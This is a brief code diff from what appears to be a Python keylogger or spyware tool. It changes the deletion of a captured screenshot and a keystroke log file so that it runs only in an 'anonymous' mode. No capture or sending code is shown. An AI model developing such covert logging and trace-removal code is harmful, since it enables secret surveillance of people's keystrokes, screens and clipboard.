@@ -80,11 +80,12 @@ def save_data(logs):
     # key_logs.clear()
 
     # delete local logs if anonymous
-    try:
-        os.remove('ss.png')
-        os.remove('logs.txt')
-    finally:
-        pass
+    if IS_ANONYMOUS:
+        try:
+            os.remove('ss.png')
+            os.remove('logs.txt')
+        finally:
+            pass
 
 
 def make_local_logs(message: str, copied_text: str):
